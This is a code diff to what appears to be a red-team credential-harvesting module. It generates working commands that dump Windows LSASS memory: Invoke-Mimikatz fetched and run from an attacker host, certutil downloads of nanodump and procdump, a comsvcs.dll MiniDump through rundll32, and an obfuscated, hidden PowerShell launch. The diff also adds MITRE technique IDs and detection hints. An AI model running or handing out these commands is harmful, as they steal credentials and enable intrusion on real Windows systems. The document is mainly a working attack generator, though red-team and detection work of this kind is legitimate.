@@ -5,7 +5,7 @@ from a compromised Windows host. For use in authorized red team exercises only.
 """
 import random
 import string
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 
 from .obfuscate import ps_tick_marks
 
@@ -23,6 +23,9 @@ class HarvestResult:
     command: str
     technique: str
     notes: str
+    techniques: list[str] = field(default_factory=list)
+    risk: str = "HIGH"
+    detections: list[str] = field(default_factory=list)
 
 
 def _rand_var(length: int = 4) -> str:
@@ -33,10 +36,10 @@ def _rand_var(length: int = 4) -> str:
 
 # ── Techniques ────────────────────────────────────────────────────────────────
 
-def _mimikatz_invoke(outfile: str, obfuscate: bool) -> HarvestResult:
+def _mimikatz_invoke(outfile: str, obfuscate: bool, lhost: str, lport: int) -> HarvestResult:
     url_var = _rand_var()
     cmd_var = _rand_var()
-    url = "https://ATTACKER/Invoke-Mimikatz.ps1"
+    url = f"http://{lhost}:{lport}/Invoke-Mimikatz.ps1"
     invoke = f"Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' | Out-File -Encoding ASCII {outfile}"
     cmd = f"{url_var}='{url}';{cmd_var}=(New-Object Net.WebClient).DownloadString({url_var});IEX {cmd_var};{invoke}"
     if obfuscate:
@@ -45,9 +48,16 @@ def _mimikatz_invoke(outfile: str, obfuscate: bool) -> HarvestResult:
         command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
         technique="mimikatz_invoke",
         notes=(
-            "Replace ATTACKER with your staging server hosting Invoke-Mimikatz.ps1. "
+            f"Invoke-Mimikatz.ps1 served from http://{lhost}:{lport}/. "
             "Requires local admin. Output written to " + outfile
         ),
+        techniques=["T1003.001"],
+        risk="CRITICAL",
+        detections=[
+            "Event 10 (Sysmon: ProcessAccess) — LSASS read by non-system process",
+            "Invoke-Mimikatz script block logging (Event 4104)",
+            "PowerShell DownloadString to staging server (Event 4104 + network)",
+        ],
     )
 
 
@@ -57,10 +67,10 @@ def _certutil_exec(url: str, tmp_exe: str, run_cmd: str) -> str:
     return f"{dl} && {run_cmd} && {cleanup}"
 
 
-def _nanodump(outfile: str, obfuscate: bool) -> HarvestResult:
+def _nanodump(outfile: str, obfuscate: bool, lhost: str, lport: int) -> HarvestResult:
     tmp = "C:\\Windows\\Temp\\nd.exe"
     cmd = _certutil_exec(
-        "https://ATTACKER/nanodump.exe",
+        f"http://{lhost}:{lport}/nanodump.exe",
         tmp,
         f"{tmp} --write {outfile} --valid",
     )
@@ -68,18 +78,25 @@ def _nanodump(outfile: str, obfuscate: bool) -> HarvestResult:
         command=cmd,
         technique="nanodump",
         notes=(
-            "Replace ATTACKER with your staging server hosting nanodump.exe. "
+            f"nanodump.exe served from http://{lhost}:{lport}/. "
             "LSASS minidump written to " + outfile + ". "
             "Parse offline with: pypykatz lsa minidump " + outfile
         ),
+        techniques=["T1003.001"],
+        risk="CRITICAL",
+        detections=[
+            "certutil outbound connection to staging server (Event 4688 + network)",
+            "Sysmon Event 10 (ProcessAccess on lsass.exe)",
+            "nanodump.exe file creation in temp directory",
+        ],
     )
 
 
-def _comsvcs_minidump(outfile: str, obfuscate: bool) -> HarvestResult:
+def _comsvcs_minidump(outfile: str, obfuscate: bool, lhost: str, lport: int) -> HarvestResult:
     pid_var = _rand_var()
     dump_cmd = (
         f"{pid_var}=(Get-Process lsass).Id;"
-        # MiniDump ordinal (not export name) required on non-English Windows — use comsvcs,MiniDump not #4
+        # MiniDump ordinal required on non-English Windows — use comsvcs,MiniDump not #4
         f"rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump {pid_var} {outfile} full"
     )
     if obfuscate:
@@ -92,13 +109,20 @@ def _comsvcs_minidump(outfile: str, obfuscate: bool) -> HarvestResult:
             "comsvcs.dll MiniDump writes LSASS to " + outfile + ". "
             "Parse with: pypykatz lsa minidump " + outfile
         ),
+        techniques=["T1003.001"],
+        risk="CRITICAL",
+        detections=[
+            "Sysmon Event 10: rundll32 accessing lsass.exe",
+            "comsvcs.dll MiniDump call via rundll32 (rare legitimate use)",
+            "Event 4656/4663 on lsass.exe handle open",
+        ],
     )
 
 
-def _procdump(outfile: str, obfuscate: bool) -> HarvestResult:
+def _procdump(outfile: str, obfuscate: bool, lhost: str, lport: int) -> HarvestResult:
     tmp = "C:\\Windows\\Temp\\pd.exe"
     cmd = _certutil_exec(
-        "https://ATTACKER/procdump.exe",
+        f"http://{lhost}:{lport}/procdump.exe",
         tmp,
         f"{tmp} -accepteula -ma lsass.exe {outfile}",
     )
@@ -106,14 +130,21 @@ def _procdump(outfile: str, obfuscate: bool) -> HarvestResult:
         command=cmd,
         technique="procdump",
         notes=(
-            "Replace ATTACKER with your staging server hosting procdump.exe (Sysinternals). "
+            f"procdump.exe (Sysinternals) served from http://{lhost}:{lport}/. "
             "Minidump written to " + outfile + ". "
             "Parse with: pypykatz lsa minidump " + outfile
         ),
+        techniques=["T1003.001"],
+        risk="CRITICAL",
+        detections=[
+            "Sysmon Event 10: procdump accessing lsass.exe",
+            "certutil download to staging server",
+            "-ma lsass.exe argument in process command line",
+        ],
     )
 
 
-def _lsass_dump_ps(outfile: str, obfuscate: bool) -> HarvestResult:
+def _lsass_dump_ps(outfile: str, obfuscate: bool, lhost: str, lport: int) -> HarvestResult:
     pid_var = _rand_var()
     handle_var = _rand_var()
     stream_var = _rand_var()
@@ -137,6 +168,13 @@ def _lsass_dump_ps(outfile: str, obfuscate: bool) -> HarvestResult:
             "Minidump written to " + outfile + ". "
             "Parse with: pypykatz lsa minidump " + outfile
         ),
+        techniques=["T1003.001"],
+        risk="CRITICAL",
+        detections=[
+            "Sysmon Event 10: PowerShell accessing lsass.exe via OpenProcess",
+            "Add-Type with kernel32/dbghelp P/Invoke (script block logging 4104)",
+            "MiniDumpWriteDump API call from PowerShell process",
+        ],
     )
 
 
@@ -151,7 +189,13 @@ _DISPATCH = {
 }
 
 
-def generate_harvest(technique: str, outfile: str, obfuscate: bool = True) -> HarvestResult:
+def generate_harvest(
+    technique: str,
+    outfile: str,
+    obfuscate: bool = True,
+    lhost: str = "192.168.1.100",
+    lport: int = 8080,
+) -> HarvestResult:
     if technique not in _DISPATCH:
         raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
-    return _DISPATCH[technique](outfile, obfuscate)
+    return _DISPATCH[technique](outfile, obfuscate, lhost, lport)
